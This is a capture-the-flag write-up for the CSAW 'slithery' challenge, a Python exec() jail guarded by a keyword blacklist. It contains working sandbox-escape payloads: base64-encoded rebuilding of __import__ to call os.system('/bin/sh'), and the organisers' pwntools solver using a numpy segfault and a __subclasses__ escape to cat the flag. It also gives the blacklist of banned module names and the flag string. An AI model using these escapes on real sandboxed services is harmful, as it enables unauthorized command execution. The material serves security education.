## slithery [100]
*Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...*

`nc pwn.chal.csaw.io 5011`

Files: `sandbox.py`
### Solution
This challenge is **extremely poorly made** (no offense intended). But before I get into that, let's have a look at the source code for `sandbox.py`:

```python
#!/usr/bin/env python3
from base64 import b64decode
import blacklist  # you don't get to see this :p
def main():
    print("EduPy 3.8.2")
    while True:
        try:
            command = input(">>> ")
            if any([x in command for x in blacklist.BLACKLIST]): raise Exception("not allowed!!")
            final_cmd = """
uOaoBPLLRN = open("sandbox.py", "r")
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8)
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU]
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))\n""" + command
            exec(final_cmd)
        except (KeyboardInterrupt, EOFError): return 0
        except Exception as e: print(f"Exception: {e}")

if __name__ == "__main__": exit(main())
```
We can play around with it for a bit:
```python
EduPy 3.8.2
>>> ls
Exception: name 'ls' is not defined
>>> import os
Exception: not allowed!!
>>> print('hi')
hi
```
In this challenge, you have a restricted python `exec()` shell that has a blacklist of unallowed strings, full list enumerated here:
```python
BLACKLIST = [ "__builtins__", "__import__", "eval", "exec", "import", "from", "os", "sys", "system", "timeit", "base64" "commands", "subprocess", "pty", "platform", "open", "read", "write", "dir", "type", ]
# a less restrictive blacklist for the 2nd sandbox. Player can use any other payload to read the flag.txt on server.
BLACKLIST2 = [ "eval", "exec", "import", "from", "timeit", "base64" "commands", "subprocess", "pty", "platform", "write", "dir", "type", ]
```
We'll get back to BLACKLIST later. For now, let's have a look at the `exec()`'d code:
```python
uOaoBPLLRN = open("sandbox.py", "r")  # file descriptor
uDwjTIgNRU = int(((54 * 8) / 16) * (1/3) - 8) #1
ORppRjAVZL = uOaoBPLLRN.readlines()[uDwjTIgNRU].strip().split(" ")  # ['from', 'base64', 'import', 'b64decode']
AAnBLJqtRv = ORppRjAVZL[uDwjTIgNRU] #'base64'
bAfGdqzzpg = ORppRjAVZL[-uDwjTIgNRU]#'b64decode'
uOaoBPLLRN.close()
HrjYMvtxwA = getattr(__import__(AAnBLJqtRv), bAfGdqzzpg)  # !!! base64.b64decode()
RMbPOQHCzt = __builtins__.__dict__[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode('utf-8')](HrjYMvtxwA(b'bnVtcHk=').decode('utf-8'))  # numpy
# Your command here
```
`BLACKLIST` only includes plaintext words. Because we have access to `base64.b64decode == HrjYMvtxwA`, we can send in any string to the shell as a base64-encoded value:
```python
>>> print('system')
Exception: not allowed!!
>>> print(HrjYMvtxwA(b'c3lzdGVt').decode())
system
```
`__import__` might be blacklisted, but `getattr()` isn't, and many objects in python have `__builtins__` as an attribute, which *in turn* has `__builtins__.__dict__['__import__'] == __import__`. All we need to do is to call `getattr(__import__('os'), 'system')('/bin/sh')`.
```python
>>> builtins = getattr(RMbPOQHCzt, HrjYMvtxwA(b'X19idWlsdGluc19f').decode())
>>> imp0rt = builtins[HrjYMvtxwA(b'X19pbXBvcnRfXw==').decode()]
>>> sYstem = getattr(imp0rt(HrjYMvtxwA(b'b3M=').decode()), HrjYMvtxwA(b'c3lzdGVt').decode())
>>> sYstem(HrjYMvtxwA(b'L2Jpbi9zaA=='))
ls
blacklist.py
flag.txt
runner.py
sandbox.py
solver.py
```

### Wait, but what about the whole "Two sandboxes" thing?
Irrelevent. According to the remote server's `solver.py`, we were supposed to initiate a *segfault due to a null dereference* in numpy, and then continue on to pierce a *second* sandbox!

Yeah. This was their solution:
```python
p = remote("localhost", "8000")
numpy_escape = "RMbPOQHCzt.vdot(RMbPOQHCzt.intc(), RMbPOQHCzt.ndarray(1, {}))"
py_escape = "[].__class__.__base__.__subclasses__()[134].__init__.__globals__['sys'].modules['os'].system('cat flag.txt')"

p.sendlineafter(">>> ", numpy_escape)
p.sendlineafter(">> ", py_escape)
p.interactive()
```

Other contestants had even faster solutions! [I suggest reading them all](https://ctftime.org/task/12994) to get a sense of how easy python jailbreaking can get.
### Flag
`flag{y4_sl1th3r3d_0ut}`